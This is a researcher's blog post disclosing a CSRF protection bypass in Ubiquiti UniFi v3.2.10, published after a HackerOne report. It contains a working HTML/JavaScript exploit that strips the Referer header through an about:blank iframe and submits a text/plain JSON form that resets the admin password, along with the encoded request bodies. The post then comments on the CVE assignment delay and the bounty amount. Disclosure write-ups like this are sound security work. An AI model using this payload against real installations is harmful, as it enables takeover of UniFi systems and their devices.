---
title: 'Ubiquiti Bug Bounty: UniFi v3.2.10 Generic CSRF Protection Bypass'
categories:
- BugBounty
- Advisory
- Exploit
---
Better late than never. This article will give you some insights about my discovered generic Cross-Site Request Forgery Protection Bypass in Ubiquiti's UniFi v3.2.10 and below, as published some time earlier this year on [HackerOne](https://hackerone.com/reports/52635). This vulnerability basically allows an attacker to compromise the UniFi installation including connected devices by e.g. changing passwords of users, adding new users, changing device usernames and passwords or by creating new WLAN configurations.

At the end of this article you can also read about the reason for the disclosure delay and about my experience with the Ubiquiti Bug Bounty program - but first let's start with the more interesting stuff ;-)

# Technical Details about the Vulnerability

It's basically about a faulty Cross-Site Request Forgery protection. Ubiquiti's CSRF protection basically verifies whether the Referer header exists and whether the header value matches the host where the UniFi application is running on. So if an attacker tries to exploit a functionality within UniFi with a Referer header, which is not the same like the host of the UniFi installation, the application denies the action:

{% highlight text %}
HTTP/1.1 401 Unauthorized
Server: Apache-Coyote/1.1
Content-Type: application/json;charset=ISO-8859-1
Content-Length: 78
Date: Thu, 19 Mar 2015 17:24:53 GMT

{ "data" : [ ] , "meta" : { "msg" : "api.err.LoginRequired" , "rc" : "error"}}
{% endhighlight %}

But if the Referer header is stripped, the application happily accepts any action. Thus all an attacker has to do is to strip out the Referer header. This could be achieved using the following script:

{% highlight html %}
<html>
<head>
<script>
function load() {
    var postdata = '<form id=csrf method=POST enctype=\'text\/plain\' action=\'https://127.0.0.1:8443/api/s/default/cmd/sitemgr\'>' +
                    '<input type=hidden name=\'json=%7B%22name%22%3A%22admin%22%2C%22x_password%22%3A%22csrfpwd%22%2C%22email%22%3A%22info%40rcesecurity.com%22%2C%22lang%22%3A%22en_US%22%2C%22cmd%22%3A%22set-self%22%7D\' value=\'\' />' +
                    '</form>';
    top.frames[0].document.body.innerHTML=postdata;
    top.frames[0].document.getElementById('csrf').submit();
}
</script>
</head>
<body onload="load()">
<iframe src="about:blank" id="noreferer">< /iframe>
</body>
</html>
{% endhighlight %}


This script is about multiple tricks to achieve the JSON-based CSRF:

### 1. enctype='text/plain'

Without using the enctype set to text/plain, the payload is sent using the "application/x-www-form-urlencoded" Content-Type, which results in a malformed request like:

{% highlight html %}
json%3D%257B%2522name%2522%253A%2522admin%2522%252C%2522x_password%2522%253A%2522csrfpwd%2522%252C%2522email%2522%253A%2522info%2540rcesecurity.com%2522%252C%2522lang%2522%253A%2522en_US%2522%252C%2522cmd%2522%253A%2522set-self%2522%257D=
{% endhighlight %}

Setting the Content-Type to text/plain using enctype solves this problem:

{% highlight html %}
json=%7B%22name%22%3A%22admin%22%2C%22x_password%22%3A%22csrfpwd%22%2C%22email%22%3A%22info%40rcesecurity.com%22%2C%22lang%22%3A%22en_US%22%2C%22cmd%22%3A%22set-self%22%7D=
{% endhighlight %}

### 2. Using the payload in the ``<input name>`` attribute

If you use the payload in the value attribute, then you have to use the name attribute too (otherwise the payload isn't sent at all), which results in a malformed request like the following:

{% highlight html %}
payload=json=%7B%22name%22%3A%22admin%22%2C%22x_password%22%3A%22csrfpwd%22%2C%22email%22%3A%22info%40rcesecurity.com%22%2C%22lang%22%3A%22en_US%22%2C%22cmd%22%3A%22set-self%22%7D
{% endhighlight %}

Using the payload in the name tag, solves this problem, since the value tag is optional:

{% highlight html %}
json=%7B%22name%22%3A%22admin%22%2C%22x_password%22%3A%22csrfpwd%22%2C%22email%22%3A%22info%40rcesecurity.com%22%2C%22lang%22%3A%22en_US%22%2C%22cmd%22%3A%22set-self%22%7D=
{% endhighlight %}

### 3. iframe src="about:blank"

To strip out the Referer header, a nice and simple trick as [outlined by webstersprodigy](http://webstersprodigy.net/2013/02/01/stripping-the-referer-in-a-cross-domain-post-request/) can be utilized: By setting the iframe source to "about:blank" the Referer header can be stripped, because "about:blank" obviously doesn't have a domain.

### 4. top.frames[0].document.body.innerHTML=postdata;

In combination with the iframe source trick, Javascript's top.frames can be used to fill the iframe with contents to submit.

Et voila. Working exploit :-)

{% highlight html %}
json=%7B%22name%22%3A%22admin%22%2C%22x_password%22%3A%22csrfpwd%22%2C%22email%22%3A%22info%40rcesecurity.com%22%2C%22lang%22%3A%22en_US%22%2C%22cmd%22%3A%22set-self%22%7D=
{% endhighlight %}

(The trailing "=" can be ignored, as the application does :-) )

# Why this delay of the official disclosure?

The reason for the delay of this blog article and the posting on Full-Disclosure, is a simple one: While doing the coordination process on HackerOne, I requested a CVE from MITRE, but due to some internal changes on their side, it took them more than one month and several pings to issue a statement about that.

Unfortunately, I then received the answer that MITRE will not assign CVEs to vulnerabilities in uncommon applications like the Ubiquiti one:

> The MITRE CVE team has started enforcing the scope and coverage requirements previously agreed upon with the CVE Editorial Board, and outlined in [http://cve.mitre.org/cve/data_sources_product_coverage.html](http://cve.mitre.org/cve/data_sources_product_coverage.html). MITRE and the CVE Editorial Board agreed upon this scope several years ago, but only recently put it into effect by declining to assign CVE IDs to products that are out of scope. We are currently working with the CVE Editorial Board to define a more up to date list of products, as well as a process that would allow products to be added or subtracted as appropriate, but do not know when this will be completed.

This is quite interesting, because for the past 5 years MITRE assigned CVEs for all my vulnerabilities without problems, but stopped to do so in general now. In my opinion this leads the CVE system ad aburdum, because vulnerabilities (regardless of their severity) in uncommon software won't be tracked anymore. So...Maybe OSVDB-IDs should replace CVEs ;-)

Well, at least at the point of finalizing this article, MITRE has added Ubiquiti to the list of proposed products.

# Final thoughts about the bug bounty program

Maybe you have heard of the really [nice RCE vulnerability](https://hackerone.com/reports/73480), which was awarded with $18k by Ubiquiti. However as this is by itself a very fitting reward, I still like to outline that my generic (!) CSRF protection bypass was only rewarded with $500, although it's possible to compromise UniFi and all connected devices - changing device passwords seems not to be so bad - right?

I think this is a heavily unbalanced rewarding scheme as applied by Ubiquiti. Plus their communication behavior during the coordination process is more than poor. Nothing more to say.		
